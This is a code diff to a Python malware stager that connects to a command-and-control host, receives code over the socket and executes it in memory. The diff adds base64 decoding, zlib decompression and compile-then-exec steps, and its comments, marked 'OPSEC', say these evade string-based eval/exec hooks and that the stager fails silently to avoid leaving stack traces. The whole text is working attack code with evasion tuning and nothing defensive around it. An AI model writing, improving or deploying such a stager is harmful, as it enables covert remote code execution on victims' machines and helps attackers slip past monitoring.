@@ -1,5 +1,7 @@
 import types
 import ssl
+import base64
+import zlib
 from socket import socket, AF_INET, SOCK_STREAM
 
 
@@ -13,9 +15,13 @@ class Start:
     def __init__(self):
         # Only attempt to receive and execute if the connection succeeds
         if self.connect(C2_HOST, C2_PORT):
-            payload = self.recv_all()
-            if payload:
-                self.exc(payload)
+            encoded_payload = self.recv_all()
+            if encoded_payload:
+                try:
+                    # OPSEC: Decode the payload in-memory just before execution
+                    self.exc(base64.b64decode(encoded_payload))
+                except Exception:
+                    pass
                 
         # Clean up the file descriptor silently
         try:
@@ -72,7 +78,18 @@ class Start:
         virtual_module.__dict__['client_socket'] = self.s
         
         try:
-            exec(payload, virtual_module.__dict__)
+            # OPSEC: Decompress and dynamically compile on the TARGET device.
+            # This guarantees bytecode compatibility across all Python versions (fixing marshal fragility).
+            # Passing a code object to exec() still evades basic string-based eval/exec hooks,
+            # while avoiding cross-version crashes.
+            try:
+                decompressed = zlib.decompress(payload)
+                code_obj = compile(decompressed, '<string>', 'exec')
+                exec(code_obj, virtual_module.__dict__)
+            except zlib.error:
+                # Fallback if the payload was sent cleartext (but base64 encoded) instead of zlib compressed
+                code_obj = compile(payload, '<string>', 'exec')
+                exec(code_obj, virtual_module.__dict__)
         except Exception:
             # In a stager, we silently fail to avoid dropping loud stack traces
             pass
